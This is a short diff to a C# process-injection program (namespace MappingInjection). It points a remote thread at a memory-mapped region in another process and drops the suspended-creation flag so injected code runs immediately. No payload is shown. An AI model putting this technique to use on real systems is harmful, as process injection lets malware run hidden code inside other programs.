@@ -77,12 +77,13 @@ namespace MappingInjection
                 OpenProcess_handle,
                 IntPtr.Zero,
                 0,
-                (IntPtr)0xfff,
+                MapRemote_address,
                 IntPtr.Zero,
-                (uint)CreationFlags.CREATE_SUSPENDED,
+                0,
                 out RemoteThread_id);
 
-            Console.WriteLine(RemoteThread_id);
+            Console.WriteLine("Remote Thread id: " + RemoteThread_id);
+            // ResumeThread((IntPtr)RemoteThread_id);
             UnmapViewOfFile(MapViewOfFile_address);
             CloseHandle(OpenProcess_handle);
 
